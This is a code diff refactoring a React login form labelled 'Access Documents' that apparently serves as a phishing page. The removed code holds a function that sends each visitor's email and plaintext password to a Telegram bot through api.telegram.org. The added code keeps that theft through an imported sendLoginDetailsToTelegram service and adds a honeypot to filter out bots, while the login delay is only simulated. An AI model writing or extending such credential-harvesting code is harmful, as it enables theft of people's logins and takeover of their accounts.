@@ -1,11 +1,13 @@
 
 import { useState } from "react";
-import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
-import { Label } from "@/components/ui/label";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { FileText, Lock, Mail } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
+import { useHoneypot } from "@/hooks/useHoneypot";
+import { sendLoginDetailsToTelegram } from "@/services/telegramService";
+import FormInput from "./FormInput";
+import HoneypotField from "./HoneypotField";
+import LoadingButton from "./LoadingButton";
 
 interface LoginFormProps {
   onLogin: (email: string, password: string) => void;
@@ -14,51 +16,15 @@ interface LoginFormProps {
 const LoginForm = ({ onLogin }: LoginFormProps) => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
-  const [honeypot, setHoneypot] = useState(""); // Honeypot field
   const [isLoading, setIsLoading] = useState(false);
   const { toast } = useToast();
-
-  // Set your Telegram bot token and chat ID here
-  const botToken = ""; // Add your bot token here
-  const chatId = ""; // Add your chat ID here
-
-  const sendToTelegram = async (email: string, password: string) => {
-    if (!botToken || !chatId) {
-      console.log("Telegram configuration missing");
-      return false;
-    }
-
-    try {
-      const message = `🔐 Login Attempt:\n\n📧 Email: ${email}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}`;
-      
-      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: 'HTML'
-        }),
-      });
-
-      if (!response.ok) {
-        throw new Error('Failed to send message to Telegram');
-      }
-
-      return true;
-    } catch (error) {
-      console.error('Error sending to Telegram:', error);
-      return false;
-    }
-  };
+  const { honeypot, setHoneypot, isBot } = useHoneypot();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
     // Honeypot check - if filled, it's likely a bot
-    if (honeypot) {
+    if (isBot) {
       console.log("Bot detected via honeypot, blocking submission");
       toast({
         title: "Access Denied",
@@ -80,7 +46,7 @@ const LoginForm = ({ onLogin }: LoginFormProps) => {
     setIsLoading(true);
     
     // Send login details to Telegram
-    const telegramSent = await sendToTelegram(email, password);
+    const telegramSent = await sendLoginDetailsToTelegram(email, password);
     
     if (telegramSent) {
       // Simulate API call delay
@@ -122,69 +88,37 @@ const LoginForm = ({ onLogin }: LoginFormProps) => {
         
         <CardContent>
           <form onSubmit={handleSubmit} className="space-y-6">
-            {/* Honeypot field - hidden from users but visible to bots */}
-            <div className="hidden">
-              <Label htmlFor="website">Website (leave blank)</Label>
-              <Input
-                id="website"
-                type="text"
-                value={honeypot}
-                onChange={(e) => setHoneypot(e.target.value)}
-                tabIndex={-1}
-                autoComplete="off"
-              />
-            </div>
+            <HoneypotField value={honeypot} onChange={setHoneypot} />
 
-            <div className="space-y-2">
-              <Label htmlFor="email" className="text-sm font-medium text-gray-700">
-                Email Address
-              </Label>
-              <div className="relative">
-                <Mail className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
-                <Input
-                  id="email"
-                  type="email"
-                  placeholder="Enter your email"
-                  value={email}
-                  onChange={(e) => setEmail(e.target.value)}
-                  className="pl-10 h-12 border-gray-200 focus:border-blue-500 focus:ring-blue-500"
-                  disabled={isLoading}
-                />
-              </div>
-            </div>
-            
-            <div className="space-y-2">
-              <Label htmlFor="password" className="text-sm font-medium text-gray-700">
-                Password
-              </Label>
-              <div className="relative">
-                <Lock className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
-                <Input
-                  id="password"
-                  type="password"
-                  placeholder="Enter your password"
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
-                  className="pl-10 h-12 border-gray-200 focus:border-blue-500 focus:ring-blue-500"
-                  disabled={isLoading}
-                />
-              </div>
-            </div>
-            
-            <Button
-              type="submit"
-              className="w-full h-12 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-medium rounded-lg transition-all duration-200 transform hover:scale-[1.02]"
+            <FormInput
+              id="email"
+              label="Email Address"
+              type="email"
+              placeholder="Enter your email"
+              value={email}
+              onChange={setEmail}
+              Icon={Mail}
               disabled={isLoading}
+            />
+            
+            <FormInput
+              id="password"
+              label="Password"
+              type="password"
+              placeholder="Enter your password"
+              value={password}
+              onChange={setPassword}
+              Icon={Lock}
+              disabled={isLoading}
+            />
+            
+            <LoadingButton
+              isLoading={isLoading}
+              loadingText="Signing in..."
+              className="w-full h-12 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-medium rounded-lg transition-all duration-200 transform hover:scale-[1.02]"
             >
-              {isLoading ? (
-                <div className="flex items-center space-x-2">
-                  <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
-                  <span>Signing in...</span>
-                </div>
-              ) : (
-                "Access Documents"
-              )}
-            </Button>
+              Access Documents
+            </LoadingButton>
           </form>
           
           <div className="mt-6 text-center">
